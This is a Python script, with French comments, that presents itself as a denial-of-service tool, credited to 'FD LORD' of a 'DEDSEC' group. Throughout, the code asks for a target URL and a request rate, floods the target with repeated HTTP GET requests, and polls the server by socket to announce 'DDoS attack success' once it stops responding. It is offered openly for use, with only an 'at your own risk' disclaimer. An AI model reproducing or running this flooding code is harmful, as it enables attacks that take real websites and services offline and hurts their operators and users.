import os
import socket
import threading
import time
import sys
import requests
from urllib.parse import urlparse

# Fonction pour afficher un texte avec un effet de simulation de frappe
def type_effect(text, delay=0.05, color=None):
    for char in text:
        if color:
            sys.stdout.write(color + char + "\033[0m")
        else:
            sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Informations sur le script avec couleurs
INFO = [
    ("\033[91m", "Script creator: •FAMOUS TECH• OR •FD LORD•\n"),
    ("\033[91m", "Script design: FD LORD\n"),
    ("\033[91m", "Legion: DEDSEC TM\n"),
    ("\033[91m", "Info: USE THIS SCRIPT AT YOUR OWN RISK\n\n"),
    ("\033[94m", "Collaborators:\n"),
    ("\033[94m", "- Lord____Z\n"),
    ("\033[93m", "- ×_topher_×\n")
]

# Variables globales
stop_attack = False
attack_interval = 5  # Intervalle en secondes pour vérifier l'état du serveur

# Fonction pour effectuer une attaque DDoS en utilisant des requêtes HTTP
def attack_http(url, rate):
    global stop_attack
    while not stop_attack:
        for _ in range(rate):
            try:
                response = requests.get(url)
                print(f"Attacking {url} with {rate} requests per second - Status Code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
        time.sleep(1)

# Fonction pour vérifier l'état du serveur
def check_server(target, port):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while not stop_attack:
        try:
            sock.connect((target, port))
            print("Server is up.")
        except socket.error:
            print("DDoS attack successs!!!!!!")
            stop_attack = True
        time.sleep(attack_interval)

# Fonction pour mettre à jour le script
def update_script():
    os.system('git pull')
    print("Script updated successfully.")

# Fonction pour démarrer l'attaque
def start_attack():
    global stop_attack

    target = input("Enter the target URL: ")
    rate = int(input("Enter the rate (requests per second): "))

    parsed_url = urlparse(target)
    if not parsed_url.scheme:
        target = 'http://' + target
        parsed_url = urlparse(target)

    port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)

    attack_thread = threading.Thread(target=attack_http, args=(target, rate))
    server_check_thread = threading.Thread(target=check_server, args=(parsed_url.hostname, port))

    attack_thread.start()
    server_check_thread.start()

    attack_thread.join()
    server_check_thread.join()

    if not stop_attack:
        print("DDOS attack failed. Press Control + C and try again.")

# Menu principal
def main():
    # Afficher les informations avec effet d'écriture
    for color, text in INFO:
        type_effect(text, color=color)

    while True:
        print("\nMenu:")
        print("1. Update Script")
        print("2. Start Attack")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            update_script()
        elif choice == "2":
            start_attack()
        elif choice == "3":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
